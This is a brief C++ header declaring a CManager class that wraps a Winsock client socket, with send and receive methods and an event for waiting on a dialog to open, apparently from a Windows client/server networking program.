// Manager.h: interface for the CManager class.
//
//////////////////////////////////////////////////////////////////////
#pragma once
#include <winsock2.h>
#include "ClientSocket.h"
class CManager  
{
	friend class CClientSocket;
	typedef int (*SENDPROC)(LPBYTE lpData, UINT nSize);
public:
	CManager(CClientSocket *pClient);
	virtual ~CManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	int Send(LPBYTE lpData, UINT nSize);
	CClientSocket	*m_pClient;

	HANDLE		m_hEventDlgOpen;
	void WaitForDialogOpen();
	void NotifyDialogIsOpen();
private:
	SENDPROC	m_pSendProc;
};
